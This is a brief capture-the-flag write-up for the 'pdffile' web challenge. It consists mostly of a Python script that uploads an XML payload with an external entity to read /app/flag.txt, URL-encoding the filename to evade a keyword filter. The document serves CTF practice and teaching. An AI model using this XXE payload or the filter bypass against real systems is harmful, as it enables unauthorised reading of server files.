# web - pdffile

```
import requests

URL = "https://pdfile.ctf.pascalctf.it/upload"

payload = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE book [
  <!ENTITY xxe SYSTEM "/app/%66%6c%61%67.txt">
]>
<book>
    <title>&xxe;</title>
    <author>x</author>
    <year>2024</year>
    <isbn>x</isbn>
    <chapters>
        <chapter number="1">
            <title>x</title>
            <content>x</content>
        </chapter>
    </chapters>
</book>'''

r = requests.post(URL, files={'file': ('x.pasx', payload)})
print(r.json().get('book_title', 'Failed'))
```
change flag to url encoded form, the library will auto decode

Solved by vicevirus

Solved by: yappare